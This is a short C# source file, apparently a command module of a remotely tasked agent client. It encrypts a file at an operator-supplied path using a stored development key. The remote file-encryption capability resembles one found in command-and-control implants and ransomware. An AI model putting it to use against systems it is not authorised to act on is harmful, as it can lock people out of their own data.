using AgentClient.Infrastructure.Utilities.KeyGen;
using AgentClient.Infrastructure.Utilities.KeyStorage;
using AgentClient.Domain.Models.Agents;
using AgentClient.Infrastructure.Cryptography.FileEncryption;

namespace AgentClient.Application.Commands
{
    public class EncryptFileCommand : AgentCommand
    {
        public override string Name => "encrypt-aes";

        public override string Execute(AgentTask task)
        {
            string path;

            if (task.Arguments == null || task.Arguments.Length == 0)
            {
                return "Arguments cannot be null or empty";
            }
            else
            {
                path = task.Arguments[0];                
            }

            try
            {
                var encrypt = new FileEncryptor(KeyStore.devKey);
                encrypt.EncryptFile(path);
            }
            catch (Exception ex)
            {
                return $"Encryption failed: {ex.Message}";
            }

            return "Encryption successful";
        }
    }
}
